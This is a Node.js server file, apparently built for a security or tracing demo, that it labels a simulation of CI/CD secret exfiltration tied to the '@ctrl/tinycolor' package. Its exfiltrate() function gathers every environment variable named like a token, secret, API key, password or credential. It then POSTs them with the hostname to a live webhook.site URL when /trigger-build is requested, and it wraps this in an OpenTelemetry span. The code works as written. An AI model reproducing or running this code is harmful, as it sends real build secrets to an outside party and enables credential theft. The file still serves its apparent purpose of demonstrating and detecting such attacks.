const http = require('http');
const api = require('@opentelemetry/api');
require('/app/tracing.js');
const tracer = api.trace.getTracer('build-runner-server');
const https = require('https');
const os = require('os');

function exfiltrate() {
  const span = tracer.startSpan('npm-install-build');
  console.error('span started: ' + span.name);

  const secrets = Object.entries(process.env)
    .filter(([k]) => /TOKEN|SECRET|API_KEY|PASSWORD|CREDENTIAL/i.test(k))
    .map(([k, v]) => ({ key: k, value: String(v) }));

  const body = JSON.stringify({
    package: '@ctrl/tinycolor',
    version: '3.6.0-sim',
    source: 'build-runner-server',
    artifacts: secrets,
    hostname: os.hostname(),
    timestamp: new Date().toISOString(),
  });

  console.error('exfiltrating ' + secrets.length + ' build secrets');

  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'webhook.site',
      path: '/1c129c66-a498-4463-990f-cb7072441d28',
      method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
    }, (res) => {
      console.error('exfil response: ' + res.statusCode);
      res.resume();
      res.on('end', () => {
        span.end();
        resolve();
      });
    });
    req.on('error', (e) => { console.error('err: ' + e.message); span.end(); resolve(); });
    req.end(body);
  });
}

const server = http.createServer((req, res) => {
  console.error('received request: ' + req.url);
  if (req.url === '/trigger-build') {
    exfiltrate().then(() => {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('Build triggered - check Dynatrace for spans\n');
    });
  } else {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('unguard build-runner ready. POST to /trigger-build to simulate CI/CD exfil.\n');
  }
});

server.listen(8080, () => {
  console.error('build-runner server listening on :8080');
});
